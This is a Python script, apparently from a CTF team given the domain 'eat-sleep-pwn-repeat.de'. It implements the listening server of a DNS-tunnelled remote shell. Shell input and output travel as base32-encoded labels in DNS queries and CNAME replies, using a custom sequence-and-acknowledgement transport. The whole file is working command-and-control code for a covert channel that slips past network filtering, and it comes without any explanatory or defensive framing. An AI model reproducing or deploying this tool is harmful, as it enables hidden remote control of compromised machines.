#!/usr/bin/env python3
from dnslib import *
import asyncio
import base64
import struct
import sys

class TransportLayer:
    def __init__(self, conn_id):
        self.outbuf = b''
        self.seq = 0
        self.inbuf = b''
        self.ack = 0
        self.conn_id = conn_id
        self.read_cb = None

    def on_data(self, cb):
        self.read_cb = cb

    def read(self):
        res = self.inbuf
        self.inbuf = b''
        return res

    def write(self, data):
        self.outbuf += data

    def process_packet(self, packet):
        assert len(packet) >= 6

        conn_id, seq, ack = struct.unpack('<HHH', packet[:6])
        data = packet[6:]
        # print('process_packet: conn=%d seq=%d/%d ack=%d/%d data=%r' % (
            # conn_id, seq, self.ack, ack, self.seq, data))

        assert conn_id == self.conn_id
        if seq == self.ack:
            self.inbuf += data
            self.ack += len(data)
            if data and self.read_cb:
                asyncio.get_event_loop().call_later(0, self.read_cb)
        else:
            # print('Received out of band data with seq nr %d/%d' % (seq, self.ack))
            assert seq < self.ack

        if ack > self.seq:
            forget = ack - self.seq
            assert forget <= len(self.outbuf)
            self.outbuf = self.outbuf[forget:]
            self.seq += forget
        return len(data)

    def make_packet(self, max_size):
        payload_size = min(len(self.outbuf), max_size - 6)
        data = self.outbuf[:payload_size]
        # print('make_packet: conn=%d seq=%d ack=%d data=%r' % (self.conn_id, self.seq, self.ack, data))
        packet = struct.pack('<HHH', self.conn_id, self.seq, self.ack) + data
        return packet

    def has_data(self):
        return len(self.outbuf) > 0

domain = 'eat-sleep-pwn-repeat.de'

def decode_b32(s):
    s = s.upper()
    for i in range(10):
        try:
            return base64.b32decode(s)
        except:
            s += b'='
    raise ValueError('Invalid base32')

def data_to_name(data):
    data = base64.b32encode(data).rstrip(b'=')
    chunks = []
    chunk_size = 62
    for i in range(0, len(data), chunk_size):
        chunks.append(data[i:i+chunk_size])
    chunks += domain.encode().split(b'.')
    return b'.'.join(chunks)

def parse_name(label):
    return decode_b32(b''.join(label.label[:-domain.count('.')-1]))

class Server:
    def __init__(self, stream):
        self.stream = stream

    def connection_made(self, transport):
        self.transport = transport

    def datagram_received(self, data, addr):
        query = DNSRecord.parse(data)

        packet = parse_name(query.q.qname)
        self.stream.process_packet(packet)

        packet = self.stream.make_packet(130)
        response = DNSRecord(DNSHeader(id=query.header.id, qr=1, aa=1, ra=1),
                      q=query.q,
                      a=RR(domain, QTYPE.CNAME, rdata=CNAME(data_to_name(packet))))

        self.transport.sendto(response.pack(), addr)

class RemoteShell:
    def __init__(self, stream):
        self.stream = stream
        self.stream.on_data(self.remote_handler)

    async def main_loop(self):
        reader = asyncio.StreamReader()
        reader_protocol = asyncio.StreamReaderProtocol(reader)
        await asyncio.get_event_loop().connect_read_pipe(lambda: reader_protocol, sys.stdin)

        while True:
            line = await reader.readline()
            if not line:
                break
            self.stream.write(line)

    def remote_handler(self):
        data = self.stream.read()
        sys.stdout.buffer.write(data)
        sys.stdout.flush()

if __name__ == '__main__':
    stream = TransportLayer(0x1337)
    host = sys.argv[1]
    port = int(sys.argv[2])

    loop = asyncio.get_event_loop()
    listen = loop.create_datagram_endpoint(
            lambda: Server(stream), local_addr=(host, port))
    transport, protocol = loop.run_until_complete(listen)

    shell = RemoteShell(stream)
    try:
        loop.run_until_complete(shell.main_loop())
    except KeyboardInterrupt:
        pass
    transport.close()
    loop.close()
